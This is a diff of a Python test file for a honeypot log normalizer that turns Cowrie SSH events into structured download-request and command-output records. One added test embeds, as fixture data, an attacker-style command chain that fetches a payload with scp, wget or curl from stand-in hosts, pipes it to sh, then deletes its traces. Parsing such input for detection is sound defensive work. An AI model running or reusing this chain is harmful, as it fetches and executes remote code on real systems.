@@ -1,15 +1,15 @@
+import json
 from pathlib import Path
 
 from honeynet.cowrie import normalize_lines
 from honeynet.models import EventType
 
 FIXTURE = Path(__file__).parents[1] / "fixtures" / "cowrie_basic.jsonl"
-INTELLIGENCE_FIXTURE = (
-    Path(__file__).parents[1] / "fixtures" / "cowrie_session_intelligence.jsonl"
-)
+INTELLIGENCE_FIXTURE = Path(__file__).parents[1] / "fixtures" / "cowrie_session_intelligence.jsonl"
 SIMULATED_TRANSFER_FIXTURE = (
     Path(__file__).parents[1] / "fixtures" / "cowrie_simulated_transfer.jsonl"
 )
+PERSONA_OUTPUT_FIXTURE = Path(__file__).parents[1] / "fixtures" / "cowrie_persona_output.jsonl"
 
 
 def test_cowrie_fixture_is_normalized_without_network_activity() -> None:
@@ -82,6 +82,7 @@ def test_extended_cowrie_metadata_and_artifact_provenance_are_normalized() -> No
         "filename": "client.conf",
         "origin": "stdin_capture",
         "role": "config",
+        "capture_status": "complete",
     }
     failed_transfer = next(
         event for event in events if event.event_type is EventType.FILE_DOWNLOAD_REQUESTED
@@ -106,6 +107,54 @@ def test_direct_upload_is_classified_without_opening_the_file() -> None:
     assert event.data["origin"] == "direct_upload"
     assert event.data["role"] == "script"
     assert event.data["filename"] == "example.sh"
+    assert event.data["capture_status"] == "complete"
+
+
+def test_empty_upload_is_explicitly_classified_with_zero_size() -> None:
+    line = (
+        '{"eventid":"cowrie.session.file_upload","sensor":"pl-lab-01",'
+        '"timestamp":"2026-08-29T10:00:00Z","session":"empty-upload",'
+        '"src_ip":"192.0.2.1","filename":"sshd",'
+        '"shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}'
+    )
+
+    event = next(iter(normalize_lines([line])))
+
+    assert event.data["size_bytes"] == 0
+    assert event.data["capture_status"] == "empty_upload"
+
+
+def test_compound_transfer_chain_is_projected_into_structured_requests() -> None:
+    command = (
+        "if scp -F sshcfg -i key.ppk dlr@203.0.113.20:sh out_sh; then "
+        "chmod +x out_sh; ./out_sh; else "
+        "(wget -qO- https://payload.invalid/stage || "
+        "curl -fsSL https://payload.invalid/stage) | sh -s ssh; "
+        "fi; rm -rf key.ppk sshcfg out_sh"
+    )
+    line = (
+        '{"eventid":"cowrie.command.input","sensor":"pl-lab-01",'
+        '"timestamp":"2026-08-29T10:00:00Z","session":"compound-transfer",'
+        f'"src_ip":"192.0.2.1","input":{json.dumps(command)}}}'
+    )
+
+    events = list(normalize_lines([line]))
+    requests = [event for event in events if event.event_type is EventType.FILE_DOWNLOAD_REQUESTED]
+
+    assert len(events) == 4
+    assert [event.data["tool"] for event in requests] == ["scp", "wget", "curl"]
+    assert requests[0].data == {
+        "url": "scp://203.0.113.20/sh",
+        "tool": "scp",
+        "outcome": "unknown",
+        "destination_filename": "out_sh",
+        "phase": "primary",
+        "execution_intended": True,
+        "cleanup_intended": True,
+    }
+    assert all(event.data["phase"] == "fallback" for event in requests[1:])
+    assert all(event.data["execution_intended"] is True for event in requests[1:])
+    assert all(event.data["cleanup_intended"] is True for event in requests[1:])
 
 
 def test_simulated_transfer_is_normalized_as_contained_intent_only() -> None:
@@ -122,3 +171,20 @@ def test_simulated_transfer_is_normalized_as_contained_intent_only() -> None:
         "destination_filename": "stage.sh",
     }
     assert "placeholder_sha256" not in event.data
+
+
+def test_emulated_command_output_is_normalized_with_bounded_safe_fields() -> None:
+    with PERSONA_OUTPUT_FIXTURE.open(encoding="utf-8") as stream:
+        events = list(normalize_lines(stream))
+
+    assert len(events) == 1
+    event = events[0]
+    assert event.event_type is EventType.COMMAND_OUTPUT
+    assert event.data == {
+        "command": "nproc",
+        "tool": "nproc",
+        "stdout": "8\n",
+        "stderr": "",
+        "exit_code": 0,
+        "emulated": True,
+    }
